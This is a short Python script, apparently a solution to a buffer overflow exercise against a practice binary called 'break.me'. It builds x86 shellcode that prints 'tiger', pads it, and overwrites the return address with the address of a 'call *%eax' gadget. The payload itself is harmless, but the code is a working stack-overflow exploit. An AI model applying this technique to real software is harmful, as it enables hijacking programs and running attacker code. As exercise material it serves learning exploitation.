import struct

# THIS SHOULD OUTPUT "TIGER" TO THE TERMINAL.
# COMMAND USED TO VERIFY THIS "python buffer.py | ./break.me"

padding="\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x74\x69\x67\x65\x72"+"A"*51
eip = struct.pack("I", 0x080484b3)
eip2= struct.pack("I", 0x080484b3) # 80484b3:       ff d0                   call   *%eax

print padding+eip+eip2
